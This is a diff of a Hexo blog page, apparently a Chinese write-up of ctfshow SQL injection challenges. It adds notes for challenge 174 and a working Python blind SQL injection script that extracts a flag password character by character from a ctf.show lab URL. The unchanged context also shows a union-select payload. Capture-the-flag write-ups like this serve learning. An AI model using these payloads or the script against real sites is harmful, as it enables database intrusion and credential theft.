@@ -17,8 +17,9 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://s3.ax1x.com/2020/11/14/DCAtTs.png">
 <meta property="og:image" content="https://s3.ax1x.com/2020/11/14/DCAlSf.png">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/04/siHhi8.png">
 <meta property="article:published_time" content="2020-11-14T04:58:15.000Z">
-<meta property="article:modified_time" content="2021-01-03T12:06:41.951Z">
+<meta property="article:modified_time" content="2021-01-04T14:50:19.834Z">
 <meta property="article:author" content="Wh1tecell">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://s3.ax1x.com/2020/11/14/DCAtTs.png">
@@ -71,7 +72,7 @@
 			</ul>
 		</nav>
 		<nav>
-    文章累计 21
+    文章累计 22
            </nav>
 		<nav class="header-smart-menu">
     		
@@ -202,8 +203,10 @@
 <p><strong>payload:</strong><code>100 &#39; union select id,hex(username),right(password,40)from ctfshow_web.ctfshow_user3 --+</code></p>
 <h2 id="174"><a href="#174" class="headerlink" title="174"></a>174</h2><p>过滤了数字和flag</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#39;&#x2F;flag|[0-9]&#x2F;i&#39;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-
+<p>正常思路就是使用base64编码 再将得到的数字就行替换</p>
+<p>这里用py脚本 因为抓包的时候发现id 等于1时候会有 admin 直接使用盲注脚本</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/siHhi8"><img src="https://s3.ax1x.com/2021/01/04/siHhi8.png" alt="siHhi8.png"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(1, 100):</span><br><span class="line">    for j in r&#39;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&#39;:</span><br><span class="line">        url &#x3D; &quot;http:&#x2F;&#x2F;ee3ae2e8-a293-4d7a-add1-4a644c4c9af9.chall.ctf.show&#x2F;api&#x2F;v4.php?id&#x3D;&quot;</span><br><span class="line">        payload &#x3D; &#39;&#39;&#39;1&#39; and substr((select password from ctfshow_user4 where username&#x3D;&quot;flag&quot;),%d,1)&#x3D;&quot;%c&quot;--+&#39;&#39;&#39;% (i,j)</span><br><span class="line">        r &#x3D; requests.get(url + payload)</span><br><span class="line">        #print(url+payload)</span><br><span class="line">        #print(r.text)</span><br><span class="line">        if &#39;admin&#39; in r.text:</span><br><span class="line">            flag +&#x3D; j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
 
 
 
